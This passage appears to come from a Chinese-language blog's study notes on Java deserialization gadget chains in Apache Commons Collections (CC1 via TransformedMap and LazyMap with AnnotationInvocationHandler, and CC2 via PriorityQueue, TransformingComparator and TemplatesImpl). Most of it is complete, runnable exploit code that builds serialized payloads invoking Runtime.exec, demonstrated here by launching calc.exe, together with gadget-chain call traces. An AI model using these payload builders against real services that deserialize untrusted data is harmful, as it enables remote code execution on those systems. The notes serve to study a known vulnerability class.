<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以下步骤就相当于 invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Map——checkSetValue(Object value)只处理了value,所以我们只需要将runtime传入value即可</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="AnnotationInvocationHandler类"><a href="#AnnotationInvocationHandler类" class="headerlink" title="AnnotationInvocationHandler类"></a>AnnotationInvocationHandler类</h1><p>这个类是CC1的漏洞成因</p>
<p>这时，我们只需要再找一个包含可控<code>Map</code>字段，并会在反序列化时对这个<code>Map</code>进行<code>setValue()</code>或<code>get()</code>操作的公共对象。</p>
<p>幸运的是，前辈们在JDK较早的版本中发现了<code>AnnotationInvocationHandler</code>这个对象 <em>（较新版本的JDK可以使用<code>BadAttributeValueExpException</code>，在这里就不展开了）</em> ，它在初始化时可以传入一个<code>Map</code>类型参数赋值给字段<code>memberValues</code>，<code>readObject()</code>过程中如果满足一定条件就会对<code>memberValues</code>中的元素进行<code>setValue()</code>：</p>
<p>AnnotationInvocationHandler类</p>
<p>主要有两部分</p>
<h2 id="0x01-构造方法"><a href="#0x01-构造方法" class="headerlink" title="0x01 构造方法"></a>0x01 构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">       Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">       <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">           superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">           superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">       <span class="built_in">this</span>.type = type;</span><br><span class="line">       <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>通过分析，接收两个参数 class对象（注解）和map对象，这个map是我们可以控制的，可以放置我们构造好的map。</p>
<h2 id="0x02-readObject"><a href="#0x02-readObject" class="headerlink" title="0x02 readObject"></a>0x02 readObject</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">       <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           annotationType = AnnotationType.getInstance(type);</span><br><span class="line">       &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">           <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">       <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">       <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">           Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">           <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">               <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">               <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                     value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                           value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>通过分析</p>
<p>AnnotationTypeMismatchExceptionProxy类对我们来说无法使用,所以在transformers之前加上一个ConstantTransformer类,就可以在递归调用以上的iTransform[i].trasfrom()之前使object Runtime.class</p>
<p>因为不管传入的参数是什么,ConstantTransformer.transform()只会返回ConstantTransformer.iConstant</p>
<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">    ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);s</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">    fout.writeObject(o);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化</span></span><br><span class="line">    fin.readObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line">					 TransformedMap.checkSetValue()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br><span class="line"></span><br><span class="line">	Requires:</span><br><span class="line">		commons-collections</span><br></pre></td></tr></table></figure>







<h1 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h1><img src="/2023/03/15/CC1/1623075894_60be2c3691871913b637d.png!small" class="" title="1623075894_60be2c3691871913b637d.png!small?1623075895996">

<p>由于不是public访问权限，直接访问AnnotationInvocationHandler类是行不通的，通过分析AnnotationInvocationHandler类，发现这个类实现了InvocationHandler接口，是不是觉得InvocationHandler接口有点眼熟，没错，这不是动态代理吗。</p>
<p>既然是动态代理，那就好办了，我们的目标是调用LazyMap类的get方法，那么可以通过Proxy类的静态方法newProxyInstance来创建LazyMap类的动态代理对象，当lazyMap调用方法时就会调用代理对象的invoke方法。</p>
<p>回顾一下Proxy类的newProxyInstance方法的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h);</span><br></pre></td></tr></table></figure>

<p>参数loader表示目标对象所属类的加载器，因此这里要传入Map的类加载器</p>
<p>参数interfaces表示目标对象实现的接口（通过反射获取），也就是目标对象lazyMap实现的接口，这里还是传入Map对象</p>
<p>参数h表示代理类要完成的功能，注意参数h的类型时InvocationHandler，因此这里我们要传入AnnotationInvocationHandler对象</p>
<p> 当调用readObject方法时，memberValues的值就是代理对象proxyMap（也就是LazyMap的代理对象），只要代理对象proxyMap调用方法就会执行AnnotationInvocationHandler中的invoke方法（代理对象调用任何方法InvocationHandler的invoke方法都会进行拦截，这就是动态代理技术）。</p>
<img src="/2023/03/15/CC1/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70.png" class="" title="img">



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazmap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);</span><br><span class="line">        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(annotationInvocationHandler);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>CC2</title>
    <url>/2023/04/05/CC2/</url>
    <content><![CDATA[<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cc;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类TestTemplatesImpl并转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.cc.TestTemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(TemplatesImpl_instance , <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//设置comparator属性</span></span><br><span class="line">        Field field=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//设置queue属性</span></span><br><span class="line">        field=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//队列至少需要2个元素</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//序列化 ---&gt; 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<p>链子结构</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.readObject()-&gt;heapify();</span><br><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()</span><br><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()-&gt; comparator.compare(E)</span><br><span class="line">comparator为构造的 new InvokerTransformer(&quot;newTransformer&quot;,null,null);</span><br><span class="line">//E为我们构造的恶意类</span><br><span class="line">InvokerTransformer-&gt;tranform(E)</span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()</span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()</span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()+newInstance()</span><br><span class="line">defineTransletClasses() //将字节码转为为对象 </span><br><span class="line">newInstance() //实例化这个对象</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>InvokerTransformer.transform()</code>转换元素，进而获取第一个元素<code>TemplatesImpl</code>的<code>newTransformer()</code>并调用，最终导致命令执行</p>
<p>再写几个关键方法</p>
<p>apache commons collections-3.0 的TransformingComparato没有Serializable 接口</p>
<p>TransformingComparato构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                              <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>compare方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">       <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>InvokerTransformer</p>
<p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    </span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);    &#125;</span><br></pre></td></tr></table></figure>

